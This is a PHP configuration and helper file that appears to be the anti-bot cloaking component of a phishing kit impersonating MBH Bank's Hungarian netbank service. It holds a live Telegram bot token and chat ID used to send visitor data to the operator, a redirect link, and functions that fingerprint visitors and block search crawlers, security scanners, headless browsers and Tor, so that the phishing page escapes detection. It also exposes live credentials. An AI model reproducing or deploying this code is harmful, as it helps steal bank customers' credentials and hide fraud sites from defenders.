<?php
// Anti-Bot System Configuration
// Generated: 2026-04-17
// Service: Live

// Telegram Bot Settings
$token_forVISITOR = "7917404252:AAEWiPffoX3t8xHB7xJCNyNshsL5CuTeifU";
$token_chatid_VISITOR = "-4993128425";

// Redirect Settings
$link = "https://ser.ktl03.cyou/m";
$redirect_to = "https://www.mbhbank.hu/digitalis-szolgaltatasok/netbank";

// Anti-Detection Settings
$anti_proxy = "no";
$anti_vpn = "no";
$anti_tor = "yes";
$anti_web_crawler = "yes";
$max_fraud_score = "110";

// Validation Settings
$true_login = "yes";
$lock_country = "no";

// reCAPTCHA Settings - Service Live
// Site Key: HTML code for your site
$recaptcha_site_key = "6LeDwmQtAAAAAIQ5wughn5f9Tbxn2QoocFABfBIs";
// Secret Key: Server-side communication
$recaptcha_secret = "6LeDwmQtAAAAADfoY3GOJK1vESa3TjQ4wgmGEtpy";

// Session start
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// Get Real IP
function getRealIpAddr() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Get Browser Info
function getBrowser() {
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $bname = 'Unknown';

    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) {
        $bname = 'Internet Explorer';
    } elseif(preg_match('/Firefox/i',$u_agent)) {
        $bname = 'Mozilla Firefox';
    } elseif(preg_match('/Chrome/i',$u_agent)) {
        $bname = 'Google Chrome';
    } elseif(preg_match('/Safari/i',$u_agent)) {
        $bname = 'Apple Safari';
    } elseif(preg_match('/Opera/i',$u_agent)) {
        $bname = 'Opera';
    } elseif(preg_match('/Netscape/i',$u_agent)) {
        $bname = 'Netscape';
    }

    return $bname;
}

// Get OS
function getOs() {
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform = 'Unknown';

    $os_array = array(
        '/windows nt 10/i'      =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $u_agent)) {
            $os_platform = $value;
        }
    }
    return $os_platform;
}

// Get Location from IP (Free - No API Key Needed)
function getLocationFromIP($ip) {
    $url = "http://ip-api.com/json/" . $ip;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $result = curl_exec($ch);
    curl_close($ch);

    if ($result) {
        $data = json_decode($result, true);
        if ($data && $data['status'] == 'success') {
            return array(
                'country' => $data['country'],
                'countryCode' => $data['countryCode'],
                'city' => $data['city'],
                'isp' => $data['isp'],
                'org' => $data['org'],
                'as' => $data['as'],
                'lat' => $data['lat'],
                'lon' => $data['lon'],
                'timezone' => $data['timezone']
            );
        }
    }
    return false;
}

// Verify reCAPTCHA
function verifyRecaptcha($response, $secret) {
    $url = 'https://www.google.com/recaptcha/api/siteverify';
    $data = array(
        'secret' => $secret,
        'response' => $response,
        'remoteip' => $_SERVER['REMOTE_ADDR']
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

    $json = json_decode($result, true);
    return $json['success'] === true;
}

// Send Telegram Message
function sendTelegram($message, $token, $chatid) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = array(
        'chat_id' => $chatid,
        'text' => $message,
        'parse_mode' => 'HTML'
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_exec($ch);
    curl_close($ch);
}

// BOT DETECTION METHODS (No API Required)

// 1. Check User Agent for Bots
function isBotUserAgent() {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

    $bots = array(
        'bot', 'crawl', 'spider', 'slurp', 'search', 'googlebot', 'bingbot', 
        'yandexbot', 'baiduspider', 'facebookexternalhit', 'twitterbot', 
        'rogerbot', 'linkedinbot', 'embedly', 'quora link preview', 
        'showyoubot', 'outbrain', 'pinterest', 'slackbot', 'vkshare',
        'w3c_validator', 'mj12bot', 'ahrefsbot', 'semrushbot', 'dotbot',
        'gigabot', 'msnbot', 'yandeximages', 'turnitinbot', 'blexbot',
        'nimbostratus', 'python', 'curl', 'wget', 'scrapy', 'httpclient',
        'java', 'libwww', 'perl', 'ruby', 'php', 'node', 'axios', 'postman',
        'insomnia', 'http_request2', 'http_request', 'winhttp', 
        'mechanize', 'urllib', 'requests', 'headless', 'selenium', 'phantomjs',
        'puppeteer', 'playwright', 'cypress', 'nightmare', 'zombie', 'slimerjs',
        'webdriver', 'geckodriver', 'chromedriver'
    );

    foreach ($bots as $bot) {
        if (strpos($user_agent, $bot) !== false) {
            return true;
        }
    }

    return false;
}

// 2. Check for Headless Browsers
function isHeadlessBrowser() {
    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);

    if (strpos($ua, 'headlesschrome') !== false) {
        return true;
    }

    if (isset($_SERVER['HTTP_SEC_CH_UA'])) {
        $sec_ch_ua = strtolower($_SERVER['HTTP_SEC_CH_UA']);
        if (strpos($sec_ch_ua, 'headless') !== false) {
            return true;
        }
    }

    return false;
}

// 3. Check for Automation Headers
function hasAutomationHeaders() {
    $automation_headers = array(
        'HTTP_SELENIUM',
        'HTTP_NIGHTMARE',
        'HTTP_CYPRESS',
        'HTTP_PLAYWRIGHT',
        'HTTP_PUPPETEER',
        'HTTP_PHANTOMJS'
    );

    foreach ($automation_headers as $header) {
        if (isset($_SERVER[$header])) {
            return true;
        }
    }

    return false;
}

// 4. Check for Missing Browser Headers (Bots often miss these)
function hasMissingHeaders() {
    $score = 0;

    if (empty($_SERVER['HTTP_ACCEPT'])) {
        $score += 25;
    }
    if (empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        $score += 25;
    }
    if (empty($_SERVER['HTTP_ACCEPT_ENCODING'])) {
        $score += 25;
    }
    if (empty($_SERVER['HTTP_CACHE_CONTROL'])) {
        $score += 10;
    }

    return $score;
}

// 5. Check for Tor Exit Nodes
function isTorExitNode() {
    global $anti_tor;
    if ($anti_tor != "yes") return false;

    $ip = getRealIpAddr();
    // Check against Tor DNSBL
    $rev_ip = implode('.', array_reverse(explode('.', $ip)));
    $tor_check = $rev_ip . ".dnsel.torproject.org";

    $dns = dns_get_record($tor_check, DNS_A);
    if (!empty($dns)) {
        foreach ($dns as $record) {
            if ($record['ip'] == '127.0.0.2') {
                return true;
            }
        }
    }

    return false;
}

// 6. Check for Web Crawlers
function isWebCrawler() {
    global $anti_web_crawler;
    if ($anti_web_crawler != "yes") return false;

    $crawlers = array(
        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
        'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
    );

    $ua = $_SERVER['HTTP_USER_AGENT'];
    foreach ($crawlers as $crawler) {
        if (stripos($ua, $crawler) !== false) {
            return true;
        }
    }

    return false;
}

// 7. Check for VPN/Proxy
function isVPNOrProxy() {
    global $anti_proxy, $anti_vpn;
    if ($anti_proxy != "yes" && $anti_vpn != "yes") return false;

    $proxy_headers = array(
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'HTTP_CF_CONNECTING_IP',
        'HTTP_CLIENT_IP',
        'HTTP_VIA',
        'HTTP_PROXY_CONNECTION',
        'HTTP_X_PROXY_ID',
        'HTTP_X_REAL_IP'
    );

    $proxy_count = 0;
    foreach ($proxy_headers as $header) {
        if (!empty($_SERVER[$header])) {
            $proxy_count++;
        }
    }

    // If too many proxy headers
    if ($proxy_count > 2) {
        return true;
    }

    return false;
}

// 8. Advanced Bot Detection
function advancedBotCheck() {
    $indicators = array();

    // Check JavaScript capability
    if (!isset($_SESSION['js_enabled']) || $_SESSION['js_enabled'] !== true) {
        $indicators['no_js'] = true;
    }

    // Check mouse movement
    if (!isset($_SESSION['mouse_moved']) || $_SESSION['mouse_moved'] !== true) {
        $indicators['no_mouse'] = true;
    }

    // Check screen resolution
    if (!isset($_SESSION['screen_resolution']) || empty($_SESSION['screen_resolution'])) {
        $indicators['no_screen'] = true;
    }

    // Check timezone
    if (!isset($_SESSION['timezone']) || empty($_SESSION['timezone'])) {
        $indicators['no_timezone'] = true;
    }

    // Check time spent on page
    if (isset($_SESSION['page_load_time'])) {
        $time_spent = time() - $_SESSION['page_load_time'];
        if ($time_spent < 2) {
            $indicators['too_fast'] = true;
        }
    }

    return $indicators;
}

// Calculate Total Risk Score
function calculateRiskScore() {
    $score = 0;

    // User Agent checks
    if (isBotUserAgent()) {
        $score += 50;
    }
    if (isHeadlessBrowser()) {
        $score += 40;
    }
    if (isWebCrawler()) {
        $score += 60;
    }

    // Automation checks
    if (hasAutomationHeaders()) {
        $score += 45;
    }
    if (isTorExitNode()) {
        $score += 35;
    }
    if (isVPNOrProxy()) {
        $score += 25;
    }

    // Header checks
    $score += hasMissingHeaders();

    // Behavior checks
    $indicators = advancedBotCheck();
    if (isset($indicators['no_js'])) {
        $score += 30;
    }
    if (isset($indicators['no_mouse'])) {
        $score += 20;
    }
    if (isset($indicators['no_screen'])) {
        $score += 15;
    }
    if (isset($indicators['no_timezone'])) {
        $score += 10;
    }
    if (isset($indicators['too_fast'])) {
        $score += 25;
    }

    // No referrer
    if (empty($_SERVER['HTTP_REFERER'])) {
        $score += 10;
    }

    return $score;
}

// Main Bot Detection Function
function isBot() {
    // Immediate blocks
    if (isBotUserAgent()) return true;
    if (isHeadlessBrowser()) return true;
    if (isWebCrawler()) return true;
    if (hasAutomationHeaders()) return true;
    if (isTorExitNode()) return true;

    // Score-based detection
    $score = calculateRiskScore();
    global $max_fraud_score;

    if ($score >= intval($max_fraud_score)) {
        return true;
    }

    return false;
}

// Generate CSRF Token
function generateCSRF() {
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

// Validate CSRF Token
function validateCSRF($token) {
    return isset($_SESSION['csrf_token']) && $token === $_SESSION['csrf_token'];
}
?>
